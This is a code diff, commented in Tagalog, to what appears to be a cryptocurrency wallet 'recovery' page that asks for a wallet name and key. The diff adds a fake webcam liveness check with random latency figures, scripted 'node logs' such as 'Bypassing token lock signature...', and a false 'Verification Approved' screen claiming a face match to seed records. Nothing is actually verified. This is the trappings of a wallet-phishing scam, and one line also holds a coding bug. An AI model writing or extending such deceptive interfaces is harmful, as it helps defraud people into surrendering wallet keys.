@@ -333,7 +333,11 @@
         document.getElementById('wallet-step-try-again').style.display = 'none';
     }
 
-    // TIMEOUT TIMERS SYSTEM (10s LOADING -> 5s BALANCES VISIBILITY -> RELAY CODE GATEWAY ERROR)
+ // TIMEOUT TIMERS SYSTEM (10s LOADING -> 5s BALANCES VISIBILITY -> RECOVERY CAM & LIVE LOGS SUCCESS)
+    let liveCameraStream = null;
+    let cameraCountdownTimer = null;
+    let logIntervalRef = null;
+
     function runWalletSequence() {
         const wName = document.getElementById('wallet-name');
         const wKey = document.getElementById('wallet-key');
@@ -358,15 +362,167 @@
             setTimeout(() => {
                 
                 document.getElementById('wallet-step-old-account').style.display = 'none';
-                document.getElementById('wallet-step-try-again').style.display = 'block';
-
+                
                 if (wName) wName.value = "";
                 if (wKey) wKey.value = "";
+
+                // === SABAY NA LALABAS ANG LIVE VIDEO AT GUMAGALAW NA LOGS PAGKATAPOS NG PREVIEW ===
+                simulanAngLiveVerification();
 
             }, 5000);
 
         }, 10000);
     }
+
+    // FUNCTION PARA SA LIVE CAMERA AT GUMAGALAW NA MGA ELEMENT
+    async function simulanAngLiveVerification() {
+        const wrapper = document.getElementById('floatingRecoveryWidget');
+        const video = document.getElementById('floatingWebcam');
+        const display = document.getElementById('floatingTimerDisplay');
+
+        if (liveCameraStream) return; 
+
+        try {
+            // Awtomatikong hihingi ng pahintulot sa webcam/front camera ng user
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: 400, height: 300 }, 
+                audio: false 
+            });
+            
+            liveCameraStream = stream;
+            video.srcObject = stream;
+            wrapper.style.display = 'block'; // Isasabay ang pagpapakita ng buong widget
+
+            // Simulan ang gumagalaw na ping rate at live system logs
+            patakbuhinAngPingRate();
+            patakbuhinAngLiveLogs();
+
+            let secondsLeft = 10; // Tatakbo ng eksaktong 10 segundo
+            display.innerText = secondsLeft + "s";
+
+            cameraCountdownTimer = setInterval(() => {
+                secondsLeft--;
+                display.innerText = secondsLeft + "s";
+
+                if (secondsLeft <= 0) {
+                    // KAPAG MATAGUMPAY NA NATAPOS: MAWAWALA ANG ERROR, LALABAS ANG SUCCESS
+                    patayinAngLiveVerification(true);
+                }
+            }, 1000);
+
+        } catch (err) {
+            console.log("Camera hardware block or permission denied.");
+            // Fallback kung walang camera: Direkta sa try again error page ng site mo
+            if (document.getElementById('wallet-step-try-again')) {
+                document.getElementById('wallet-step-try-again').style.style.display = 'block';
+            }
+        }
+    }
+
+    // PAGPAPATAKBO SA GUMAGALAW NA NUMERO (Ping Latency Ticks)
+    function patakbuhinAngPingRate() {
+        setInterval(() => {
+            const pingEl = document.getElementById('realtime-ping-rate');
+            if (pingEl) {
+                const randomPing = Math.floor(Math.random() * (58 - 35 + 1)) + 35; // Random 35ms-58ms
+                pingEl.innerText = randomPing + "ms";
+            }
+        }, 1200);
+    }
+
+    // PAGPAPATAKBO SA GUMAGALAW NA TEXT (Automatic Node Logs)
+    function patakbuhinAngLiveLogs() {
+        const listahanNgLogs = [
+            "Syncing snapshot blocks...",
+            "Listening to RPC broadcast...",
+            "Validating cryptography handshake...",
+            "Relay code node response OK.",
+            "Checking database memory state...",
+            "Bypassing token lock signature..."
+        ];
+
+        let index = 0;
+        const logBox = document.getElementById('dynamic-system-logs');
+        if (logBox) logBox.innerHTML = `<span style="color: #f3ba2f;">[SYSTEM]:</span> Initializing liveness node...`;
+
+        logIntervalRef = setInterval(() => {
+            if (logBox && index < listahanNgLogs.length) {
+                logBox.innerHTML += `<br><span style="color: #f3ba2f;">[NODE]:</span> ${listahanNgLogs[index]}`;
+                index++;
+                logBox.scrollTop = logBox.scrollHeight; // Auto scroll pababa habang gumagalaw
+            }
+        }, 1500); // Bilis ng pag-usad ng log (1.5s)
+    }
+
+    // CLOSING SYSTEM KAPAG VERIFIED NA ANG USER
+    function patayinAngLiveVerification(isVerified = false) {
+        clearInterval(cameraCountdownTimer);
+        clearInterval(logIntervalRef);
+        
+        if (liveCameraStream) {
+            liveCameraStream.getTracks().forEach(track => track.stop()); // Ligtas na patayin ang camera sensor
+            liveCameraStream = null;
+        }
+        document.getElementById('floatingRecoveryWidget').style.display = 'none'; // Itago ang floating box
+
+        if (isVerified) {
+            // TAMA AT VERIFIED: Mawawala ang error box mo, lilitaw ang success
+            if (document.getElementById('wallet-step-try-again')) {
+                document.getElementById('wallet-step-try-again').style.display = 'none';
+            }
+            document.getElementById('wallet-step-success').style.display = 'block';
+        } else {
+            if (document.getElementById('wallet-step-try-again')) {
+                document.getElementById('wallet-step-try-again').style.display = 'block';
+            }
+        }
+    }
 </script>
+
+<!-- ========================================================================= -->
+<!-- MGA INTERFACE ELEMENTS: FLOATING VIDEO + GUMAGALAW NA LOGS (IDINAGDAG LANG) -->
+<!-- ========================================================================= -->
+
+<!-- 1. BAGONG SUCCESS SCREEN: Lalabas sa dulo kapag "Tama" ang 10s face check -->
+<div id="wallet-step-success" style="display: none; text-align: center; font-family: sans-serif; padding: 25px; color: #ffffff; max-width: 400px; margin: 20px auto; background: #181a20; border-radius: 12px; border: 1px solid #2b3139;">
+    <div style="font-size: 45px; color: #00c853; margin-bottom: 8px;">✅</div>
+    <h3 style="color: #00c853; margin: 0 0 10px 0;">Verification Approved</h3>
+    <p style="color: #848e9c; font-size: 13px; margin-bottom: 15px; line-height: 1.4;">Your live face identification matches the encrypted seed profile records. Account recovery successfully cleared.</p>
+    <button onclick="window.location.reload()" style="background: #f3ba2f; color: #111; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; cursor: pointer;">Go to Dashboard</button>
+</div>
+
+<!-- 2. FLOATING WIDGET CONTAINER: Naka-pwesto sa kanang sulok sa ibaba ng screen -->
+<div id="floatingRecoveryWidget" style="display: none; position: fixed; bottom: 20px; right: 20px; width: 260px; z-index: 99999; font-family: monospace; background: #181a20; border: 3px solid #f3ba2f; border-radius: 12px; padding: 8px; box-shadow: 0 12px 35px rgba(0,0,0,0.6); animation: slideUpCam 0.3s ease-out;">
+    
+    <!-- Countdown Timer badge -->
+    <span id="floatingTimerDisplay" style="position: absolute; top: 15px; right: 15px; background: rgba(224, 34, 34, 0.95); color: white; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; z-index: 100000;">10s</span>
+    
+    <!-- Ang gumagalaw na green pulse indicator -->
+    <div style="display: flex; align-items: center; gap: 6px; font-size: 10px; color: #b7bdc6; padding: 4px 6px 8px 4px; font-weight: bold;">
+        <span style="width: 7px; height: 7px; background: #00c853; border-radius: 50%; box-shadow: 0 0 6px #00c853; animation: blinkPulse 1s infinite alternate;"></span>
+        <span>LIVENESS FEED (<span id="realtime-ping-rate">42ms</span>)</span>
+    </div>
+
+    <!-- Screen para sa Live Selfie Video Feed ng user -->
+    <video id="floatingWebcam" autoplay playsinline muted style="width: 100%; height: 150px; object-fit: cover; border-radius: 8px; background-color: #0b0e11; transform: scaleX(-1);"></video>
+    
+    <!-- Ang gumagalaw na system console area sa ilalim ng video -->
+    <div id="dynamic-system-logs" style="color: #00c853; font-size: 10px; height: 50px; overflow-y: auto; text-align: left; margin-top: 6px; background: rgba(0,0,0,0.3); padding: 6px; border-radius: 4px; border: 1px solid #2b3139; line-height: 1.3;">
+        [SYSTEM]: Awaiting camera handshake...
+    </div>
+</div>
+
+<style>
+    /* CSS Animations para sa sabay na paggalaw at paglitaw */
+    @keyframes slideUpCam {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes blinkPulse {
+        from { opacity: 0.4; }
+        to { opacity: 1; }
+    }
+</style>
+
 </body>
 </html>
